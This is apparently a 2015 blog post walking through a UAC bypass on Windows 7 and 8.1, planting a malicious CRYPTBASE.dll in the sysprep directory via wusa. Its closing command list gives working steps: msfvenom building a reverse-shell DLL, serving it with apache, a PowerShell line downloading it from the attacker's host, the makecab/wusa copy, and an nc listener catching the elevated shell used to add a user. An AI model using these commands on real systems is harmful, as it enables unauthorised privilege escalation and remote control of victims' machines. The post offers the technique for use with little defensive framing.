---
title: 		"UAC Bypass: Windows 7 and Windows 8.1"
date:		2015-10-02
tags:		[posts]
excerpt: 	"This is my first article, I hope you like it!"
---
(At the end you will find the commands used)

**Target 1: Windows 7 x64 build 6.1.7601**

Suppose you have a limited shell, our user is part of the "Administrators" group
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass1.png" alt="">

but we can't perform privileged operations
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass2.png" alt="">

let's bypass UAC!

First we create a DLL containing a reverse shell:
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass3.png" alt="">

From our limited shell we can download the DLL with powershell:
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass4.png" alt="">

Now we use wusa to move the dll into a privileged dir(sysprep):
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass5.png" alt="">

We can see that the file has been successfully moved
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass6.png" alt="">

Let's run sysprep.exe and listen with 'nc':
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass7.png" alt="">

Now we have bypassed the UAC and we can create a new user!
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass8.png" alt="">
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass9.png" alt="">

**Target 2: Windows 8.1 x64 build 6.3.9600**

This time we have to do the same tasks but rename the dll differently:
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass10.png" alt="">

Once downloaded to the target machine and used wusa for copying into sysprep, We can launch sysprep.exe:
<img src="{{ site.url }}{{ site.baseurl }}/images/uacbypass11.png" alt="">

And here you're done!

For further information, look at the resources, there are other methods to bypass the UAC.
Have fun :)

**Commands:**
**Kali**
```console
>msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=53 -f dll -o CRYPTBASE.dll
>cp CRYPTBASE.dll /var/www
>service apache2 start
>nc -vlp 53
```

**Windows 7**
```console
>powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('http://10.1.1.3/CRYPTBASE.dll','dest path CRYPTBASE.dll')
>makecab "source path CRYPTBASE.dll" "dest path try.tmp"
>wusa "source path try.tmp" /extract:"path to sysprep dir"
>cd "path sysprep (c:->windows->system32->sysprep)"
>sysprep.exe
```

**Resources:**
1. [](https://github.com/hfiref0x/UACME)
2. [](https://www.greyhathacker.net/?p=796)
